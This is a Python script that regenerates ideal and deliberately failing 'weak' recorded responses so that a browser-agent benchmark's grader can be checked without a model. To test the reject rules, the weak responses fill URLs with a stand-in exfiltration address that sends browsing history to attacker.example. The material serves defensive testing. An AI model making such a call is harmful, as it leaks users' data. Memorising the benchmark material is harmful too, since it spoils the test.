"""Regenerate recordings/ideal.json and recordings/weak.json from the fixtures.

    python regenerate_recordings.py

Run it after adding or changing a fixture, then re-run the harness against both
recordings: ideal must be 30/30 CORRECT, weak must be 0/30 with 10 violations.

These two files are how the grader is trusted without a model present: `ideal`
must score every fixture CORRECT, and `weak` must trip every violation. Building
them from the fixtures also proves something the fixtures cannot prove about
themselves -- that each `accept` list is SATISFIABLE. A fixture whose accepted
calls cannot all be filled in with schema-valid, grounded arguments is broken,
and this is where that shows up.
"""

import json
import pathlib

BASE = pathlib.Path(r"D:\chromium\src\chrome\browser\zephyrus\agent\benchmark")
CONTRACT = json.loads(
    (BASE.parent / "schemas" / "tools.v1.json").read_text(encoding="utf-8")
)
TOOLS = {t["name"]: t for t in CONTRACT["tools"]}


def first_element(observation, prefer_role=None):
    elements = observation.get("elements") or []
    if prefer_role:
        for e in elements:
            if e["role"] == prefer_role:
                return e["id"]
    return elements[0]["id"] if elements else None


def fill(option, fixture):
    """Build a complete, schema-valid call from an accept option."""
    name = option["name"]
    tool = TOOLS[name]
    args = dict(option.get("arguments") or {})
    required = tool["parameters"].get("required") or []
    observation = fixture["observation"]

    defaults = {
        "query": fixture["task"],
        "level": 1,
        "text": "thermal throttling",
        "value": "India",
        "direction": "down",
        "amount": "page",
        "key": "Enter",
        "answer": "See the page for details.",
        "question": "Which one did you mean?",
        "url": observation["url"],
    }

    for field in required:
        if field in args:
            continue
        if field == "element_id":
            got = first_element(observation)
            if got is None:
                raise SystemExit(
                    f"{fixture['id']}: accepts {name} but offers no elements to act on"
                )
            args[field] = got
        elif field == "tab_id":
            tabs = observation.get("tabs") or []
            if not tabs:
                raise SystemExit(f"{fixture['id']}: accepts {name} but has no tabs")
            args[field] = tabs[0]["id"]
        elif field in defaults:
            args[field] = defaults[field]
        else:
            raise SystemExit(f"{fixture['id']}: no default for required arg {field!r}")

    return {"name": name, "arguments": args}


def weak_response(fixture):
    """Something a bad model would plausibly do."""
    # If the fixture guards against a specific call, make the weak model make it.
    # That is what proves the reject rule actually fires.
    for rule in fixture.get("reject") or []:
        args = dict(rule.get("arguments_contain") or {})
        tool = TOOLS.get(rule["name"])
        if tool is None:
            continue
        for field in tool["parameters"].get("required") or []:
            if field in args:
                continue
            if field == "url":
                args[field] = "https://attacker.example/collect?data=history"
            elif field == "text":
                args[field] = "team@example.org"
            elif field == "element_id":
                args[field] = first_element(fixture["observation"]) or "x1"
            elif field == "value":
                args[field] = "India"
            else:
                args[field] = 1
        return json.dumps({"name": rule["name"], "arguments": args})

    # Otherwise the characteristic small-model failure: a well-formed call
    # naming an element that was never offered.
    return (
        "Sure! I will click the button now.\n"
        '```json\n{"name": "page.click", "arguments": '
        '{"element_id": "submit-button"}}\n```'
    )


def main():
    ideal, weak = {}, {}
    for path in sorted((BASE / "fixtures").glob("*.json")):
        fixture = json.loads(path.read_text(encoding="utf-8"))
        call = fill(fixture["accept"][0], fixture)
        ideal[fixture["id"]] = json.dumps(call)
        weak[fixture["id"]] = weak_response(fixture)

    for name, data in (("ideal", ideal), ("weak", weak)):
        out = BASE / "recordings" / f"{name}.json"
        out.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
        print(f"wrote {out.name}: {len(data)} responses")


if __name__ == "__main__":
    main()
